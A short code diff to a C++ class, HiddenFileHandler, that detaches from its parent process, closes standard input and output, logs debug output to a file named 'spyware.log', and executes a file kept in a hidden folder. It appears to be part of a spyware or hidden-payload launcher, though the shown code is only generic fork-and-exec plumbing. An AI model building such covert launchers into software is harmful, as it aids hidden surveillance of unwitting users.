@@ -1,5 +1,6 @@
 #include "HiddenFileHandler.h"
 
+#define DEBUG
 
 std::string HiddenFileHandler::getPath(const std::string fileName) {
     return folderName + "/" + fileName;
@@ -36,6 +37,20 @@ Status HiddenFileHandler::runFile(const std::string& fileName) {
     if (pid > 0) {
         std::exit(EXIT_SUCCESS); // Exit the parent process
     }
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+#ifdef DEBUG
+    int stdoutFile_fd = open("spyware.log", O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (stdoutFile_fd == -1) {
+        std::cerr << "failed to open stdout file spyware.log" << std::endl;
+        std::exit(EXIT_FAILURE);
+    }
+    if (dup2(stdoutFile_fd, fileno(stdout)) == -1) {
+        std::perror("Failed to redirect stdout to file");
+        std::exit(EXIT_FAILURE);
+    }
+#endif
+    std::cerr << "exec hidden file" << std::endl;
     execl(filePath.c_str(), "");
     std::exit(EXIT_FAILURE);
 }
